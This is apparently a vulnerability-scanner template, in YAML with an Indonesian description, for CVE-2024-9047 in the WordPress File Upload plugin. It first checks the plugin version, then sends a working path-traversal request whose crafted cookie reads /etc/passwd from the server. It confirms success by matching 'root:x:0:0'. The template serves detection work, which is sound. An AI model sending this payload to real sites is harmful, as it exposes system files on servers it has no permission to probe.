id: CVE-2024-9047

info:
  name: WordPress File Upload Plugin - Arbitrary File Read
  author: Betmen-N-Dgeng
  severity: high
  description: |
    WordPress File Upload Plugin sebelum versi 4.24.11 memiliki kerentanan yang memungkinkan penyerang membaca file sembarang di server.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9047
  tags: cve,cve2024,wordpress,file-upload,arbitrary-file-read

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wp-file-upload/release_notes.txt"

    matchers:
      - type: word
        words:
          - "<strong>Version"
        part: body

    extractors:
      - type: regex
        regex:
          - '<strong>Version\s+([0-9]+\.[0-9]+\.[0-9]+)</strong>'
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce"

    headers:
      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
      Cookie: "wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ={{timestamp}}; wfu_ABSPATH=/;"

    matchers:
      - type: word
        words:
          - "/bin/bash"
          - "root:x:0:0"
        condition: and
        part: body

    pre-condition:
      - "{{compare_versions(extracted_version, '4.24.11')}}"

    extractors:
      - type: regex
        regex:
          - 'root:x:0:0'
        part: body

    payloads:
      timestamp:
        - "{{to_unix_time(now())}}"
